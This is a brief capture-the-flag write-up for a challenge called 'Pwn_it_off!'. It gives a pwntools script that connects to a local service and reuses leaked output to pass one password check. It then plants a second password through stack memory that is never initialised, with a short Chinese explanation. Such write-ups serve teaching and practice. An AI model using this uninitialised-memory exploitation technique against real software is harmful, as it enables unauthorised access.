# Pwn_it_off!

```py
from pwn import *
p=remote("127.0.0.1","62045")
while True:
    content=p.recvline()
    if b"[Error]" in content:
        break
    password=content[28:28+15]
p.sendlineafter("ssword.\n",password+b'\x00'+p64(10000)[:-1]) #直接p64多出来了一个字节，所以丢掉最后一个
p.sendlineafter("ssword.\n",'10000')
p.interactive()
```
看完免费提示就懂了，两个检查密码的函数都没有初始化。第一个检查函数的密码是之前beep的内容，第二个检查函数的密码则可以在第一个检查函数里通过输入自己设置。调试看清楚位置关系即可